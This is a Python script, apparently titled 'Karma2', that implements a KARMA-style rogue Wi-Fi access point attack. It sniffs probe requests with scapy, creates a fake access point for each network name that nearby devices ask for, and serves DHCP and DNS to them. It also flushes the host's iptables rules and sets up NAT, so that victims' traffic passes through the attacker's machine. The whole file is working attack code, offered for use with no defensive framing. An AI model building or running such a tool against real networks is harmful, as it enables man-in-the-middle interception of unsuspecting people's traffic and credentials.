#!/usr/bin/env python

from threading import Lock
import time,random,re,tempfile
import subprocess
from scapy.all import *

class Karma2:

  class AccessPoint:
    def __init__(self, karma, essid):
      self.essid = essid
      self.karma = karma

      iface,airbase_process = self.create_access_point(essid)
      subnet = self.karma.get_unique_subnet()
      self.setup_iface(iface,subnet)
      dhcpd_process = self.start_dhcpd(iface,subnet)

    def start_dhcpd(self, iface, subnet):
      # create a temporary file
      print "[+] Starting dhcp server %s %s"%(iface,subnet)
      cmd = ['dnsmasq',
        '-d',
        '-i', iface,
        '-F', '192.168.%d.100,192.168.%d.200'%(subnet,subnet),
        '--dhcp-option=option:router,192.168.%d.254'%(subnet),
        '--dhcp-option=option:dns-server,192.168.%d.254'%(subnet),
        '-z',
        '-R','-S','8.8.8.8',
      ]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      return p

    def setup_iface(self, iface, subnet):
      print "[+] Uping iface %s w/ subnet %s"%(iface,subnet)
      iprange = "192.168.%d.254/24"%subnet
      cmd = ["ifconfig",iface,iprange]
      p = subprocess.Popen(cmd)
      p.wait()

    def create_access_point(self, essid):
      print "[+] Creating AP %s"%essid
      cmd = ["airbase-ng",
        "--essid", "%s"%essid,
        "-c","4",
        self.karma.ifmon]
      p = subprocess.Popen(cmd, stdout=subprocess.PIPE)

      while True:
        line = p.stdout.readline()
        m = re.match(r".*Created tap interface (\w+)",line)
        if m is not None:
          iface, = m.groups()
          return iface,p

  def __init__(self, ifgw, ifmon):
    self.ifmon = ifmon
    self.ifgw = ifgw
    self.aps = {}
    self.subnets = set(xrange(50,256)) 
    self.clear_iptables()
    self.setup_nat(ifgw)

  def clear_iptables(self):
    print "[+] Clearing iptables rules"
    cmd = ['iptables','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

    cmd = ['iptables','-t','nat','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def setup_nat(self, iface):
    print "[+] Setting up NAT on %s"%iface
    cmd = ["iptables", 
      "-t","nat",
      "-A","POSTROUTING",
      "-o",iface,
      "-j","MASQUERADE"]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def get_unique_subnet(self):
    return self.subnets.pop()

  def do_sniff(self):
    # rededge1510016,
    def _filter(packet):
      if packet.haslayer(Dot11ProbeReq):
        section = packet[Dot11ProbeReq][Dot11Elt]
        # SSID
        if section.ID == 0 and section.info != '':
          if not section.info in self.aps.keys():
            self.aps[section.info] = self.AccessPoint(self, section.info)

    sniff(prn=_filter)

# CC:5D:4E:EC:A6:CC  E4:F8:EF:1B:7B:A3  -75    0 - 1e
if __name__ == '__main__':

  # network interface connect to the outside world
  GATEWAY_INTERFACE='wlan0'
  # 802.11 monitor interface created using airmon-zc 
  MONITOR_INTERFACE='wlan1mon'
  km = Karma2(GATEWAY_INTERFACE, MONITOR_INTERFACE)

  #km.do_sniff()
  for i in xrange(0,10):
    Karma2.AccessPoint(km,"NSA honeypot #%d"%i)

  while True:
    time.sleep(1)
